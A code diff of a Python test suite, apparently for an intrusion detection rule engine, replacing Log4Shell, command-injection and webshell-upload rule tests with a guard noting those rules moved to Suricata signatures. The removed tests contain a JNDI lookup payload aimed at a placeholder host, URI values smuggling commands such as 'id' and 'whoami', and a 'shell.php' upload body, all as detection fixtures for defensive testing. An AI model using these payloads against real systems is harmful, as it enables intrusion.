@@ -416,49 +416,26 @@ def test_login_path_regex_covers_common_forms(mods: dict[str, Any]) -> None:
 # ---------- 规则内容 ----------
 
 
-def test_log4shell_word_boundary_and_header_vector(mods: dict[str, Any]) -> None:
-    rule = _by_name(mods["builtin"].BUILTIN_RULES, "内置-表达式注入与JNDI(Log4Shell)")
-    # 无词边界时 `/api/spellcheck` 会报 critical
-    assert (
-        mods["engine"].match_rule(rule, _entry(mods, {**_HTTP, "uri": "/api/spellcheck"}, "http"))
-        is False
-    )
-    # CVE-2021-44228 的头注入向量（Zeek 的头值只在 req_headers 里）
-    hit = _entry(mods, {**_HTTP, "req_headers": "USER-AGENT: ${jndi:ldap://evil/x}"}, "http")
-    assert mods["engine"].match_rule(rule, hit) is True
+def test_web_attack_rules_moved_to_signature_engine(mods: dict[str, Any]) -> None:
+    """Web 攻击特征类规则已**整批交给签名引擎**（Suricata / ET Open）。
 
-
-def test_command_injection_without_trailing_space(mods: dict[str, Any]) -> None:
-    rule = _by_name(mods["builtin"].BUILTIN_RULES, "内置-命令注入特征")
-    for payload in ("/x?a=1;id", "/x?a=1|id", "/x?a=1&&whoami"):
-        assert mods["engine"].match_rule(rule, _entry(mods, {**_HTTP, "uri": payload}, "http")), (
-            payload
-        )
-    assert (
-        mods["engine"].match_rule(rule, _entry(mods, {**_HTTP, "uri": "/x?a=1"}, "http")) is False
-    )
-
-
-def test_webshell_upload_requires_an_actual_upload(mods: dict[str, Any]) -> None:
-    """判据是「上传了脚本文件」，不是「请求路径以 .php 结尾」。"""
-    rule = _by_name(mods["builtin"].BUILTIN_RULES, "内置-WebShell上传")
-    normal_form = _entry(
-        mods, {**_HTTP, "uri": "/login.php", "method": "POST", "status_code": 302}, "http"
-    )
-    assert mods["engine"].match_rule(rule, normal_form) is False
-    upload = _entry(
-        mods,
-        {
-            **_HTTP,
-            "uri": "/api/upload",
-            "method": "POST",
-            "status_code": 200,
-            "content_type": "multipart/form-data; boundary=x",
-            "body": 'Content-Disposition: form-data; name="f"; filename="shell.php"',
-        },
-        "http",
-    )
-    assert mods["engine"].match_rule(rule, upload) is True
+    这里原来的旧断言（Log4Shell 的词边界、命令注入不要求尾空格、WebShell 必须是真上传）
+    测的是我们自己写的那几条规则 —— 它们连同另外 40 多条一起删了（理由见
+    `builtin.DELETED_RULES` 里 2026-10 那组说明：判据全落在 Suricata 有一一对应关键字的
+    HTTP/文件/TLS/DNS 字段上，ET Open 本来就有现成签名）。那几条质量结论仍然成立、只是不再
+    由这个仓库维护 —— 所以只留下这条守卫：谁把它们加回内置定义，就在这里被拦住。
+    """
+    moved = set(mods["builtin"].DELETED_RULES)
+    for name in (
+        "内置-表达式注入与JNDI(Log4Shell)",
+        "内置-命令注入特征",
+        "内置-SQL注入-基础特征",
+        "内置-WebShell上传",
+        "内置-WebShell访问",
+    ):
+        assert name in moved, f"{name} 应已移交签名引擎（不在删除名单里）"
+    live = {r["name"] for r in mods["builtin"].BUILTIN_RULES}
+    assert not (moved & live), "已移交的规则不能再留在内置定义里（会两头维护、同一件事报两遍）"
 
 
 def test_no_always_true_rule_conditions(mods: dict[str, Any]) -> None:
